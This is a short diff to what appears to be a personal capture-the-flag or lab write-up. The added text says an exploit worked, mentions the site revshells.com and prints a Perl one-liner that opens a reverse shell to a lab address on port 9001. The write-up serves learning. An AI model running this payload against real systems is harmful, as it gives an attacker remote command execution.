@@ -87,4 +87,8 @@ So we run the exploit:
 
 ![[Exfiltrated-1744342000765.jpeg]]
 
-and we just happen to get in: cool beans
+and we just happen to get in: cool beans, so ngl, I just found out that theres this thing called revshells.com after looking at an online guide because idk how to continue 
+
+```
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
